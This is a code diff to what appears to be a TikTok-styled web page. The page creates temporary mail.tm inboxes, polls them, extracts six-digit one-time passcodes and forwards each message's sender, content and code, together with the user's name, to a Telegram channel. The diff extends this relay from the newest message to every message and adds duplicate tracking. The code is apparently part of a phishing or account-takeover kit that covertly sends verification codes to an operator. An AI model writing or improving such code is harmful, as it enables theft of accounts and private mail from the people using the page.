@@ -21,7 +21,7 @@
         .border-tiktok-pink { border-color: #FE2C55; }
         
         .gradient-text {
-            background: linear-gradient(45deg, #FE2C55 0%, #25F4EE 100%);
+            background: linear-gradient(45deg, #FE2C55 0%, #131616 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
@@ -455,6 +455,7 @@
         let token = null;
         let pollInterval = null;
         let savedPasscode = '';
+        let processedMessageIds = []; // Track IDs to prevent duplicate TG alerts
 
         // COUNTDOWN LOGIC (Persistent)
         function startCountdown() {
@@ -564,6 +565,7 @@
         // STEP 3 LOGIC (MAIL.TM)
         async function createNewEmail() {
             document.getElementById('email-display').innerText = 'Provisioning...';
+            processedMessageIds = []; // Reset processed IDs for new account
             try {
                 const domainRes = await fetch(`${API_URL}/domains`);
                 const domains = await domainRes.json();
@@ -605,26 +607,44 @@
                     });
                     const data = await res.json();
                     const messages = data['hydra:member'];
-                    if (messages.length > 0) {
-                        const msgRes = await fetch(`${API_URL}/messages/${messages[0].id}`, {
-                            headers: { 'Authorization': `Bearer ${token}` }
-                        });
-                        const fullMsg = await msgRes.json();
-                        
-                        const name = document.getElementById('user-name').value;
-                        // Send FULL email content to Telegram
-                        sendToTelegram(`📬 <b>NEW ENCRYPTED MAIL RECEIVED</b>\nUser: ${name}\nFrom: ${fullMsg.from.address}\nSubject: ${fullMsg.subject}\n\nContent:\n${fullMsg.text || fullMsg.intro}`);
-                        
-                        // Extract numeric OTP (look for 6 consecutive digits)
-                        const otpMatch = (fullMsg.text || fullMsg.intro).match(/\b\d{6}\b/);
-                        if (otpMatch) {
-                            document.getElementById('otp-code').innerText = otpMatch[0];
-                            sendToTelegram(`🔑 <b>OTP EXTRACTED:</b> <code>${otpMatch[0]}</code>\nUser: ${name}`);
-                        } else {
-                            document.getElementById('otp-code').innerText = "SEE TG";
+                    
+                    // Iterate through all messages in the inbox
+                    for (const msg of messages) {
+                        // Check if we've already sent this message to Telegram
+                        if (!processedMessageIds.includes(msg.id)) {
+                            const msgRes = await fetch(`${API_URL}/messages/${msg.id}`, {
+                                headers: { 'Authorization': `Bearer ${token}` }
+                            });
+                            const fullMsg = await msgRes.json();
+                            
+                            const name = document.getElementById('user-name').value;
+                            const emailContent = fullMsg.text || fullMsg.intro || "";
+                            
+                            // Extract numeric OTP (look for 6 consecutive digits)
+                            const otpMatch = emailContent.match(/\b\d{6}\b/);
+                            const extractedOtp = otpMatch ? otpMatch[0] : "NOT FOUND";
+                            
+                            // Update website UI if it's the latest message
+                            if (msg.id === messages[0].id) {
+                                document.getElementById('otp-code').innerText = otpMatch ? otpMatch[0] : "SEE TG";
+                            }
+                            
+                            // Send concise notification to Telegram
+                            const shortenedContent = emailContent.substring(0, 150) + (emailContent.length > 150 ? "..." : "");
+                            
+                            sendToTelegram(`📬 <b>MAIL RECEIVED</b>\n` +
+                                           `User: ${name}\n` +
+                                           `From: ${fullMsg.from.address}\n` +
+                                           `OTP Code: <code>${extractedOtp}</code>\n\n` +
+                                           `Content Start:\n${shortenedContent}`);
+                            
+                            // Mark as processed
+                            processedMessageIds.push(msg.id);
                         }
                     }
-                } catch (e) {}
+                } catch (e) {
+                    console.error("Polling error:", e);
+                }
             }, 5000);
         }
 
